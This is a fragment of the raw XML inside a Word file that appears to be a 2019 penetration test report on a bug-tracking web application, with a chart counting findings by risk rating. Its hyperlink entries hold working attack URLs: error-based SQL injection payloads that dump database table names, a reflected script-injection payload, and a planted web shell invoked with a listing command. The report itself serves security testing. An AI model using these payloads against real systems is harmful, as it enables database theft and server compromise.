      <w:ind w:left="720"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TableContents">
    <w:name w:val="Table Contents"/>
    <w:basedOn w:val="Normal"/>
    <w:pPr>
      <w:suppressLineNumbers/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0004341D"/>
    <w:rPr>
      <w:color w:val="0563C1" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A81704"/>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044743">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="157888058">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="226259020">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="273756124">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="436799166">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="623344757">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="641080602">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="721640610">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="935021180">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1143231408">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1153109727">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1238855359">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1347294011">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1395733407">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1439715009">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1673138873">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1739398209">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1747797599">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1772043540">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1885362542">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2101027994">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="2108112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52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/core/adodb/server.php?sql" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/search.php?project_id=0&amp;sticky_issues=off&amp;sortby=id%2Cstatus%2Cseverity%2Cextractvalue%28null%2Cconcat%280x3a%2C%28SELECT%20group_concat%280x2D%2Ctable_schema%2C0x2E%2Ctable_name%2C0x2D%29%20FROM%20information_schema.tables%20WHERE%20table_schema%20%21%3D%200x6D7973716C%20AND%20table_schema%20%21%3D%200x696E666F726D6174696F6E5F736368656D61%29%2C0x3a%29%29%20--&amp;dir=DESC&amp;hide_status_id=-2" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/robots.txt" TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/main_page.php" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/doc/" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1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52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/view_all_set.php?sort=id%2Cextractvalue%28null%2Cconcat%280x3a%2C%28SELECT%20group_concat%280x2D%2Ctable_schema%2C0x2E%2Ctable_name%2C0x2D%29%20FROM%20information_schema.tables%20WHERE%20table_schema%20%21%3D%200x6D7973716C%20AND%20table_schema%20%21%3D%200x696E666F726D6174696F6E5F736368656D61%29%2C0x3a%29%29%20--&amp;dir=ASC,&amp;type=2" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/news_menu_page.php" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.pn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52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/bug_report_page.php" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/core/" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/phpinfo.php" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/seed"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image" Target="media/image14.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/chart" Target="charts/chart1.xm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52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/shell.php?cmd=ls%20-al" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/adminbak/upgrade_unattended.php?db_type=%3Cscript%3Ealert%281%29%3C/script%3E" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/file_download.php?file_id=1&amp;type=doc" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/tmp/"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52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/my_view_page.php" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/api/" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/adminbak/upgrade_unattended.php?db_type=%27"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Issue Count vs Risk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" baseline="0"/>
              <a:t> Rating</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Sheet1!$B$1:$E$1</c:f>
              <c:strCache>
                <c:ptCount val="4"/>
                <c:pt idx="0">
                  <c:v>Critical</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>High</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>Medium</c:v>
                </c:pt>
                <c:pt idx="3">
                  <c:v>Low</c:v>
                </c:pt>
              </c:strCache>
            </c:strRef>
          </c:cat>
          <c:val>
            <c:numRef>
              <c:f>Sheet1!$B$2:$E$2</c:f>
              <c:numCache>
                <c:formatCode>General</c:formatCode>
                <c:ptCount val="4"/>
                <c:pt idx="0">
                  <c:v>3</c:v>
                </c:pt>
                <c:pt idx="1">
                  <c:v>3</c:v>
                </c:pt>
                <c:pt idx="2">
                  <c:v>3</c:v>
                </c:pt>
              </c:numCache>
            </c:numRef>
          </c:val>
        </c:ser>
        <c:dLbls>
          <c:showLegendKey val="0"/>
          <c:showVal val="0"/>
          <c:showCatName val="0"/>
          <c:showSerName val="0"/>
          <c:showPercent val="0"/>
          <c:showBubbleSize val="0"/>
        </c:dLbls>
        <c:gapWidth val="219"/>
        <c:overlap val="-27"/>
        <c:axId val="1164665040"/>
        <c:axId val="1164677552"/>
      </c:barChart>
      <c:catAx>
        <c:axId val="1164665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4677552"/>
        <c:crosses val="autoZero"/>
        <c:auto val="1"/>
        <c:lblAlgn val="ctr"/>
        <c:lblOffset val="100"/>
        <c:noMultiLvlLbl val="0"/>
      </c:catAx>
      <c:valAx>
        <c:axId val="1164677552"/>
        <c:scaling>
          <c:orientation val="minMax"/>
          <c:max val="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4665040"/>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3BAD21-BA04-4152-A15D-EC31E7ADD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28</Pages>
  <Words>4253</Words>
  <Characters>24248</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28445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INDRAJEET SINGH</cp:lastModifiedBy>
  <cp:revision>23</cp:revision>
  <cp:lastPrinted>1899-12-31T18:30:00Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-07-24T20:41:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-07-25T22:04:00Z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